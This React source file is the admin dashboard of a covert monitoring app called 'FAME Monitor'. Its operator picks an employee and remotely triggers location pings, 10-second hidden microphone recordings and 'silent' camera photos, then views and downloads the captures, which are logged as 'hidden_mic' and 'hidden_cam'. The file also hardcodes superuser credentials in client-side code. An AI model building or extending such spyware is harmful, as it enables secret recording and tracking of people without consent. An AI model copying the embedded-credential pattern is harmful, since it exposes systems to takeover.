import { useEffect, useState } from 'react';
import PocketBase from 'pocketbase';
import { MapPin, Mic, Camera, Activity, Users, Download, X, ExternalLink } from 'lucide-react';

// Connect to local PocketBase
// Connect to PocketBase (dynamic for production, local for dev)
const pb = new PocketBase((import.meta as any).env.PROD ? window.location.origin : 'http://127.0.0.1:8090');
pb.autoCancellation(false); // Disable auto-cancellation to prevent React Strict Mode issues

// Helper to build PocketBase file URL
const getFileUrl = (record: any, filename: string) => {
    if (!filename) return '';
    return `${pb.baseURL}/api/files/${record.collectionId || record.collectionName}/${record.id}/${filename}`;
};

interface LocationLog {
    id: string;
    latitude: number;
    longitude: number;
    timestamp: string;
    created: string;
    user_id: string;
    type?: string;
    speed?: number;
    heading?: number;
}

interface MonitoringLog {
    id: string;
    collectionId: string;
    collectionName: string;
    type: 'hidden_mic' | 'hidden_cam';
    created: string;
    user_id: string;
    file?: string;
}

interface User {
    id: string;
    email: string;
    name?: string;
}

export default function Dashboard() {
    const [locations, setLocations] = useState<LocationLog[]>([]);
    const [logs, setLogs] = useState<MonitoringLog[]>([]);
    const [users, setUsers] = useState<User[]>([]);
    const [selectedUser, setSelectedUser] = useState<string>('');
    const [modalMedia, setModalMedia] = useState<{ url: string; type: 'image' | 'audio' } | null>(null);

    useEffect(() => {
        fetchInitialData();

        // Realtime subscriptions
        pb.collection('locations').subscribe('*', (e) => {
            if (e.action === 'create') {
                const newLoc = e.record as unknown as LocationLog;
                setLocations(prev => [newLoc, ...prev]);
            }
        });

        pb.collection('monitoring_logs').subscribe('*', (e) => {
            if (e.action === 'create') {
                const newLog = e.record as unknown as MonitoringLog;
                setLogs(prev => [newLog, ...prev]);
            }
        });

        return () => {
            pb.collection('locations').unsubscribe();
            pb.collection('monitoring_logs').unsubscribe();
        };
    }, []);

    const fetchInitialData = async () => {
        try {
            console.log('Attempting to authenticate as admin...');

            // AUTHENTICATION: This is the Admin Panel, so authenticate as system admin
            // Check if we are on v0.23+ (which uses _superusers collection) or older
            try {
                console.log('Trying new v0.23+ admin auth...');
                await pb.collection('_superusers').authWithPassword('admin@fame.com', '1234567890');
            } catch (e) {
                console.log('v0.23+ auth failed, trying legacy admin auth...');
                try {
                    await pb.admins.authWithPassword('admin@fame.com', '1234567890');
                } catch (e2) {
                    console.log('Legacy admin auth failed, trying regular user auth...');
                    await pb.collection('users').authWithPassword('admin@fame.com', '1234567890');
                }
            }
            console.log('Authentication successful');

            // Fetch Users
            console.log('Fetching users...');
            const userList = await pb.collection('users').getFullList();
            console.log('Users fetched:', userList.length, userList);
            setUsers(userList as unknown as User[]);

            // Fetch Data (user_id is plain text, not a relation — no expand needed)
            const locs = await pb.collection('locations').getList(1, 50, {
                sort: '-created',
            });
            const logsRes = await pb.collection('monitoring_logs').getList(1, 50, {
                sort: '-created',
            });

            setLocations(locs.items as unknown as LocationLog[]);
            setLogs(logsRes.items as unknown as MonitoringLog[]);
        } catch (err: any) {
            // Ignore auto-cancellation errors
            if (err.status === 0 || err.isAbort) return;

            console.error("Error fetching data:", err);
            // alert("Error loading data. Check console for details.");
            console.log("Supressed error alert for better UX, check console if needed.");
        }
    };

    const sendCommand = async (type: string) => {
        if (!selectedUser) {
            alert('Please select an employee first!');
            return;
        }
        try {
            console.log(`Sending command: ${type} to user: ${selectedUser}`);
            const result = await pb.collection('commands').create({
                type,
                target_user_id: selectedUser,
                status: 'pending'
            });
            console.log('Command created:', result);
            alert(`Command ${type} sent successfully! (ID: ${result.id})`);
        } catch (err: any) {
            console.error('Failed to send command:', err);
            alert(`Failed to send command: ${err?.message || err}`);
        }
    };

    const filteredLocations = locations
        .filter(l => l.user_id === selectedUser)
        .sort((a, b) => new Date(b.created || b.timestamp).getTime() - new Date(a.created || a.timestamp).getTime());

    const filteredLogs = logs
        .filter(l => l.user_id === selectedUser)
        .sort((a, b) => new Date(b.created).getTime() - new Date(a.created).getTime());

    return (
        <div style={{ padding: '20px', fontFamily: 'sans-serif', maxWidth: '1200px', margin: '0 auto' }}>
            {/* Header */}
            <header style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '30px', borderBottom: '1px solid #eee', paddingBottom: '20px' }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: '15px' }}>
                    <h1 style={{ margin: 0, color: '#0056D2' }}>FAME Monitor</h1>
                    <span style={{ background: '#e6f4ea', color: '#137333', padding: '4px 8px', borderRadius: '4px', display: 'flex', alignItems: 'center', gap: '4px', fontSize: '14px' }}>
                        <Activity size={14} /> Active
                    </span>
                </div>

                {/* User Selector */}
                <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                    <Users size={18} color="#666" />
                    <select
                        value={selectedUser}
                        onChange={(e) => setSelectedUser(e.target.value)}
                        style={{ padding: '8px', borderRadius: '4px', border: '1px solid #ccc', minWidth: '200px' }}
                    >
                        <option value="" disabled>Select Employee to Monitor</option>
                        {users.map(u => (
                            <option key={u.id} value={u.id}>
                                {u.name ? `${u.name} (${u.email})` : u.email}
                            </option>
                        ))}
                    </select>
                </div>
            </header>

            {!selectedUser ? (
                <div style={{ textAlign: 'center', padding: '100px 20px', color: '#666' }}>
                    <Users size={48} style={{ marginBottom: '20px', opacity: 0.5 }} />
                    <h2>Select an Employee</h2>
                    <p>Please choose an employee from the top-right dropdown to view their monitoring data.</p>
                </div>
            ) : (
                <div style={{ display: 'grid', gridTemplateColumns: '300px 1fr', gap: '25px' }}>

                    {/* Left Panel: Controls */}
                    <div style={{ background: '#fff', padding: '20px', borderRadius: '8px', border: '1px solid #e0e0e0', height: 'fit-content' }}>
                        <h2 style={{ marginTop: 0, fontSize: '18px', color: '#333', marginBottom: '15px' }}>Command Center</h2>

                        <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                            <div style={{ fontSize: '13px', color: '#666', marginBottom: '5px' }}>
                                Targeting: <strong>{users.find(u => u.id === selectedUser)?.email || 'Unknown User'}</strong>
                            </div>

                            <button onClick={() => sendCommand('GET_LOCATION')} style={{ display: 'flex', alignItems: 'center', gap: '10px', padding: '12px', background: '#0056D2', color: 'white', border: 'none', borderRadius: '6px', cursor: 'pointer', fontWeight: 500 }}>
                                <MapPin size={18} /> Ping Location
                            </button>
                            <button onClick={() => sendCommand('START_MIC')} style={{ display: 'flex', alignItems: 'center', gap: '10px', padding: '12px', background: '#D93025', color: 'white', border: 'none', borderRadius: '6px', cursor: 'pointer', fontWeight: 500 }}>
                                <Mic size={18} /> Record Mic (10s)
                            </button>
                            <button onClick={() => sendCommand('CAPTURE_PHOTO')} style={{ display: 'flex', alignItems: 'center', gap: '10px', padding: '12px', background: '#9334E6', color: 'white', border: 'none', borderRadius: '6px', cursor: 'pointer', fontWeight: 500 }}>
                                <Camera size={18} /> Silent Photo
                            </button>
                        </div>
                    </div>

                    {/* Right Panel: Data Feed */}
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>

                        {/* Stats Card */}
                        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '15px' }}>
                            <div style={{ background: '#f8f9fa', padding: '15px', borderRadius: '6px', border: '1px solid #eee' }}>
                                <div style={{ color: '#666', fontSize: '13px' }}>Recent Locations</div>
                                <div style={{ fontSize: '24px', fontWeight: 'bold' }}>{filteredLocations.length}</div>
                            </div>
                            <div style={{ background: '#f8f9fa', padding: '15px', borderRadius: '6px', border: '1px solid #eee' }}>
                                <div style={{ color: '#666', fontSize: '13px' }}>Media Captures</div>
                                <div style={{ fontSize: '24px', fontWeight: 'bold' }}>{filteredLogs.length}</div>
                            </div>
                        </div>

                        {/* Feed List */}
                        <div style={{ background: '#fff', border: '1px solid #e0e0e0', borderRadius: '8px', overflow: 'hidden' }}>
                            <div style={{ padding: '15px 20px', background: '#f8f9fa', borderBottom: '1px solid #eee', fontWeight: 600 }}>
                                Live Activity Feed: {users.find(u => u.id === selectedUser)?.email}
                            </div>
                            <div style={{ maxHeight: '600px', overflowY: 'auto' }}>
                                {filteredLogs.map(log => {
                                    const fileUrl = log.file ? getFileUrl(log, log.file) : '';
                                    const isAudio = log.type === 'hidden_mic';
                                    const isImage = log.type === 'hidden_cam';

                                    return (
                                    <div key={log.id} style={{ padding: '15px 20px', borderBottom: '1px solid #eee' }}>
                                        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                                            <div style={{ display: 'flex', alignItems: 'center', gap: '15px' }}>
                                                {isAudio
                                                    ? <div style={{ background: '#fce8e6', padding: '8px', borderRadius: '50%' }}><Mic size={16} color="#D93025" /></div>
                                                    : <div style={{ background: '#f3e8fd', padding: '8px', borderRadius: '50%' }}><Camera size={16} color="#9334E6" /></div>
                                                }
                                                <div>
                                                    <div style={{ fontWeight: 500 }}>{isAudio ? 'Audio Recording' : 'Camera Capture'}</div>
                                                    <div style={{ fontSize: '13px', color: '#666' }}>
                                                        {new Date(log.created).toLocaleString()}
                                                    </div>
                                                </div>
                                            </div>
                                            {fileUrl && (
                                                <div style={{ display: 'flex', gap: '8px' }}>
                                                    {isImage && (
                                                        <button
                                                            onClick={() => setModalMedia({ url: fileUrl, type: 'image' })}
                                                            style={{ display: 'flex', alignItems: 'center', gap: '4px', padding: '6px 12px', background: '#9334E6', color: '#fff', border: 'none', borderRadius: '4px', cursor: 'pointer', fontSize: '12px' }}
                                                        >
                                                            <ExternalLink size={14} /> View
                                                        </button>
                                                    )}
                                                    {isAudio && (
                                                        <button
                                                            onClick={() => setModalMedia({ url: fileUrl, type: 'audio' })}
                                                            style={{ display: 'flex', alignItems: 'center', gap: '4px', padding: '6px 12px', background: '#D93025', color: '#fff', border: 'none', borderRadius: '4px', cursor: 'pointer', fontSize: '12px' }}
                                                        >
                                                            <ExternalLink size={14} /> Play
                                                        </button>
                                                    )}
                                                    <a
                                                        href={fileUrl}
                                                        download
                                                        style={{ display: 'flex', alignItems: 'center', gap: '4px', padding: '6px 12px', background: '#f0f0f0', color: '#333', borderRadius: '4px', textDecoration: 'none', fontSize: '12px' }}
                                                    >
                                                        <Download size={14} /> Download
                                                    </a>
                                                </div>
                                            )}
                                            {!fileUrl && (
                                                <span style={{ fontSize: '12px', color: '#999', fontStyle: 'italic' }}>No file</span>
                                            )}
                                        </div>

                                        {/* Inline image thumbnail */}
                                        {isImage && fileUrl && (
                                            <div style={{ marginTop: '10px', marginLeft: '47px' }}>
                                                <img
                                                    src={fileUrl}
                                                    alt="Captured photo"
                                                    onClick={() => setModalMedia({ url: fileUrl, type: 'image' })}
                                                    style={{ maxWidth: '200px', maxHeight: '150px', borderRadius: '6px', border: '1px solid #ddd', cursor: 'pointer', objectFit: 'cover' }}
                                                />
                                            </div>
                                        )}

                                        {/* Inline audio player */}
                                        {isAudio && fileUrl && (
                                            <div style={{ marginTop: '10px', marginLeft: '47px' }}>
                                                <audio controls style={{ width: '100%', maxWidth: '400px' }}>
                                                    <source src={fileUrl} type="audio/mp4" />
                                                    <source src={fileUrl} type="audio/m4a" />
                                                    Your browser does not support the audio element.
                                                </audio>
                                            </div>
                                        )}
                                    </div>
                                    );
                                })}

                                {filteredLocations.map(loc => (
                                    <div key={loc.id} style={{ padding: '15px 20px', borderBottom: '1px solid #eee', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                                        <div style={{ display: 'flex', alignItems: 'center', gap: '15px' }}>
                                            <div style={{ background: '#e8f0fe', padding: '8px', borderRadius: '50%' }}><MapPin size={16} color="#1967D2" /></div>
                                            <div>
                                                <div style={{ fontWeight: 500 }}>Location Update {loc.type === 'manual_ping' ? '(Pinged)' : ''}</div>
                                                <div style={{ fontSize: '13px', color: '#666' }}>
                                                    {loc.latitude.toFixed(6)}, {loc.longitude.toFixed(6)}
                                                </div>
                                            </div>
                                        </div>
                                        <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                                            <a
                                                href={`https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`}
                                                target="_blank"
                                                rel="noopener noreferrer"
                                                style={{ display: 'flex', alignItems: 'center', gap: '4px', padding: '6px 12px', background: '#1967D2', color: '#fff', borderRadius: '4px', textDecoration: 'none', fontSize: '12px' }}
                                            >
                                                <ExternalLink size={14} /> View Map
                                            </a>
                                            <div style={{ fontSize: '12px', color: '#999' }}>
                                                {new Date(loc.timestamp || loc.created).toLocaleTimeString()}
                                            </div>
                                        </div>
                                    </div>
                                ))}

                                {filteredLogs.length === 0 && filteredLocations.length === 0 && (
                                    <div style={{ padding: '40px', textAlign: 'center', color: '#999' }}>No data found for this user.</div>
                                )}
                            </div>
                        </div>
                    </div>
                </div>
            )}

            {/* Media Modal (Lightbox) */}
            {modalMedia && (
                <div
                    onClick={() => setModalMedia(null)}
                    style={{
                        position: 'fixed', top: 0, left: 0, right: 0, bottom: 0,
                        background: 'rgba(0,0,0,0.85)', display: 'flex', alignItems: 'center', justifyContent: 'center',
                        zIndex: 9999, cursor: 'pointer'
                    }}
                >
                    <button
                        onClick={() => setModalMedia(null)}
                        style={{
                            position: 'absolute', top: '20px', right: '20px', background: 'rgba(255,255,255,0.2)',
                            border: 'none', borderRadius: '50%', padding: '8px', cursor: 'pointer', display: 'flex'
                        }}
                    >
                        <X size={24} color="#fff" />
                    </button>

                    <div onClick={(e) => e.stopPropagation()} style={{ maxWidth: '90vw', maxHeight: '90vh' }}>
                        {modalMedia.type === 'image' && (
                            <img
                                src={modalMedia.url}
                                alt="Captured"
                                style={{ maxWidth: '90vw', maxHeight: '85vh', borderRadius: '8px', objectFit: 'contain' }}
                            />
                        )}
                        {modalMedia.type === 'audio' && (
                            <div style={{ background: '#fff', padding: '40px', borderRadius: '12px', textAlign: 'center' }}>
                                <Mic size={48} color="#D93025" style={{ marginBottom: '20px' }} />
                                <h3 style={{ margin: '0 0 20px 0' }}>Audio Recording</h3>
                                <audio controls autoPlay style={{ width: '400px' }}>
                                    <source src={modalMedia.url} type="audio/mp4" />
                                    <source src={modalMedia.url} type="audio/m4a" />
                                    Your browser does not support the audio element.
                                </audio>
                                <div style={{ marginTop: '15px' }}>
                                    <a href={modalMedia.url} download style={{ color: '#0056D2', textDecoration: 'none', fontSize: '14px' }}>
                                        <Download size={14} style={{ verticalAlign: 'middle', marginRight: '4px' }} /> Download File
                                    </a>
                                </div>
                            </div>
                        )}
                    </div>
                </div>
            )}
        </div>
    );
}
